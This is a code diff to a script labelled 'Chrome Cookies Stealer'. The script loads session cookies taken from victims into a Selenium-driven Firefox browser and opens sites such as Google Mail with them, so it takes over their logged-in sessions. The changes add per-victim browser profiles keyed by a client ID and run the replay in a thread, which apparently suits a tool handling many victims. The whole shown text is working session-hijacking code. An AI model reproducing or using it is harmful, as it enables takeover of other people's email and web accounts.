@@ -40,16 +40,15 @@ l_source = r"""
 # Chrome Cookies Stealer
 
 import ast
-from selenium import webdriver
-log('[*] modules imported [+]')
+import threading
 
 sessions = ast.literal_eval(mprint)
-log('[*] mprint decrypted')
 
-def chrome_sessions(sessions):
+def chrome_sessions(sessions, client_id):
     from selenium import webdriver
+    from selenium.webdriver.firefox.webdriver import FirefoxProfile
     from selenium.webdriver.common.keys import Keys
-    import time
+    import sys
 
     cookies = sessions
 
@@ -63,7 +62,11 @@ def chrome_sessions(sessions):
         u'accounts.google.com': u'https://mail.google.com',
     }
 
-    driver_chrome = webdriver.Firefox()
+    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{}'.format(client_id))
+    if not os.path.exists(path_to_profile):
+        os.makedirs(path_to_profile)
+    profile = FirefoxProfile(path_to_profile)
+    driver_chrome = webdriver.Firefox(profile)
 
     l = []
     for dics in cookies:
@@ -80,6 +83,6 @@ def chrome_sessions(sessions):
         driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + str(i))
         driver_chrome.refresh()
 
-
-chrome_sessions(sessions)
+chrome_threading = threading.Thread(target=chrome_sessions, args=(sessions, client_id))
+chrome_threading.start()
 """
